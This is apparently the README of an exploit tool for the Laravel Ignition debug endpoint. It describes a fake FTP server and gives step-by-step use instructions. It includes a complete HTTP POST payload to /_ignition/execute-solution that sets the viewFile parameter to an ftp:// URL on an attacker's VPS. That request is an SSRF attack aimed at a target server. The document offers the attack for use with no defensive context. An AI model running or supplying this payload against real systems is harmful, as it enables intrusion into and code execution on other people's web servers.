# laravel-debug-ftp-ssrf
A fake ftp server build for laravel~

1. Change the keyword `vps` to the address of your vps.
2. Then start the script.
3. Send the following request to the target server.
```
POST /_ignition/execute-solution HTTP/1.1
Host: damedane
Content-Type: application/json
Content-Length: ???

{ "solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters":{
    "variableName":"233",
    "viewFile":"ftp://fan:root@vps-ip:vps-port/test"
  }
}
```